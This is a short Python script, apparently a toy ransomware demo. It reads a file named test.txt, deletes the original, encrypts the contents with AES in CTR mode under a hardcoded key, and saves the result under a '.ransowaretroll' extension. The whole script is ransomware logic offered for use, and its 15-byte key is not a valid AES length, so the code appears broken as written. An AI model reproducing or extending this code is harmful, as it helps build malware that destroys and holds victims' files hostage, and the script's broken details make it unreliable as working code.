import os
import pyaes

file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testeransowares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransowaretroll"
new_file = open(new_file, "wb")
new_file.write(crypto_data)
new_file.close()